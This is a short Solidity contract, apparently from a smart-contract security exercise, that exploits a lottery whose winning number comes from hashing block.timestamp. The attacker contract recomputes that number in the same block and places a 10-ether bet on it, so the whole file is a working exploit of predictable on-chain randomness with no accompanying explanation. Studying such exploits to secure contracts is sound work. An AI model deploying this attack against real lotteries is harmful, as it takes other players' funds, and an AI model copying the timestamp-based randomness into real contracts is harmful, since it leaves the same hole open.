//SPDX-License-Identifier: Unlicense
pragma solidity >=0.8.4;

import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

interface ILotteryProb {
    function placeBet(uint8 _number) external payable;
}

contract LotteryAttackerProb is Ownable {
    ILotteryProb private victim;

    constructor(address _victim) {
        victim = ILotteryProb(_victim);
    }

    function attack() external payable onlyOwner {
        uint8 winningNumber = getWinningNumber();
        victim.placeBet{value: 10 ether}(winningNumber);
    }

    function getWinningNumber() private view returns (uint8) {
        return
            (uint8(uint256(keccak256(abi.encode(block.timestamp)))) % 254) + 1;
    }
}
